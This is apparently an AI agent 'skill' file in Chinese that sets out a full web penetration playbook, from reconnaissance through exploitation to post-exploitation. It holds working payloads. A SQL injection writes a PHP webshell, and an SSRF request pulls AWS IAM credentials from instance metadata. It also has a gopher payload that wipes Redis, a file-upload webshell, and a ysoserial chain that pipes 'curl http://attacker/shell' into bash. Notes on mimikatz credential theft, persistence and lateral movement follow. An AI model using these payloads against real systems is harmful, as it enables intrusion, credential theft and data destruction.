---
name: web渗透攻击
description: Use when encountering web应用渗透方法论 - 信息收集、漏洞发现、漏洞利用全流程
---

# Web渗透攻击

## Info

- **Domain**: web
- **Tags**: web, http, injection, exploitation

## 攻击思路
```
信息收集 → 漏洞发现 → 漏洞验证 → 漏洞利用 → 后渗透
```

## 信息收集矩阵

| 任务 | 工具 | 关键参数 |
|------|------|----------|
| 端口扫描 | nmap | -sV -sC -p- |
| 目录枚举 | ffuf/dirsearch | -fc 404 -w wordlist |
| 技术栈 | whatweb | -v |
| 子域名 | subfinder | -silent |
| JS分析 | JSLinkFinder | 端点提取 |
| 敏感文件 | ffuf | robots/.git/.env等 |

```bash
# 目录枚举
ffuf -u http://target/FUZZ -w /path/wordlist -fc 404 -mc 200,301,302 -o results.json

# JS分析提取API
python JSLinkFinder.py -i http://target/main.js -o cli
```

## 漏洞发现矩阵

| 漏洞类型 | 自动化工具 | 手工验证点 |
|----------|-----------|-----------|
| SQL注入 | sqlmap | 参数特殊字符测试 |
| XSS | dalfox/XSStrike | 输入输出对比 |
| SSRF | 自定义脚本 | URL参数替换 |
| LFI | ffuf | 路径参数测试 |
| RCE | nuclei | 命令参数注入 |
| SSTI | tplmap | 模板语法测试 |
| XXE | XXEinjector | XML参数注入 |

```bash
# SQL注入自动化
sqlmap -u "http://target?id=1" --batch --level=3 --risk=2 --threads=5

# XSS扫描
dalfox url http://target --blind https://attacker.xss.ht

# CVE扫描
nuclei -u http://target -t cve/ -severity critical,high
```

## SQL注入利用链

| 数据库类型 | 提权方法 | RCE路径 |
|------------|----------|---------|
| MySQL | UDF提权 | into outfile/load_file |
| MSSQL | xp_cmdshell | 直接命令执行 |
| PostgreSQL | COPY命令 | libc/lib扩展 |
| Oracle | Java存储过程 | DBMS_SCHEDULER |
| SQLite | load_extension | 扩展加载 |

```bash
# MySQL写入WebShell
sqlmap -u "http://target?id=1" --os-shell

# 手工写入
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/shell.php'--
```

## SSRF利用链

| 目标 | Payload | 获取内容 |
|------|---------|----------|
| 云元数据 | http://169.254.169.254/latest/meta-data/ | AWS凭据 |
| 内网服务 | http://internal-server:port | 内网资产 |
| 本地文件 | file:///etc/passwd | 敏感文件 |
| 协议走私 | gopher://target:25/_HELO%20test | SMTP/Redis等 |

```bash
# AWS元数据获取
curl http://target/ssrf?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Redis SSRF攻击
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a...
```

## 文件上传攻击

| 限制类型 | 绕过方法 | Payload |
|----------|----------|---------|
| 扩展名黑名单 | phtml/php5/phar | shell.php5 |
| 扩展名白名单 | 双写/截断 | shell.php.jpg |
| MIME检测 | 修改Content-Type | image/jpeg |
| 内容检测 | 图片马 | GIF89a<?php... |
| 重命名 | 竞争条件 | 快速访问 |

```bash
# 上传测试
Content-Disposition: form-data; name="file"; filename="shell.php5"
Content-Type: image/jpeg

GIF89a
<?php system($_GET['cmd']); ?>
```

## 反序列化攻击

| 语言 | 工具 | 常见Gadget链 |
|------|------|--------------|
| Java | ysoserial | Commons-Collections/Spring |
| PHP | phpggc | Laravel/Symfony/Magento |
| Python | pickle | __reduce__利用 |
| .NET | ysoserial.net | ObjectStateFormatter |

```bash
# Java反序列化
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker/shell|bash' | base64

# PHP反序列化
phpggc Laravel/RCE1 'system("id")'
```

## 后渗透攻击

| 任务 | 工具 | 目标 |
|------|------|------|
| 信息收集 | linpeas/winpeas | 可利用点 |
| 凭据提取 | mimikatz/LaZagne | 密码/Hash |
| 持久化 | 后门/定时任务 | 长期控制 |
| 横向移动 | 内网扫描/密码喷射 | 其他主机 |
| 权限提升 | 内核漏洞/配置错误 | root/admin |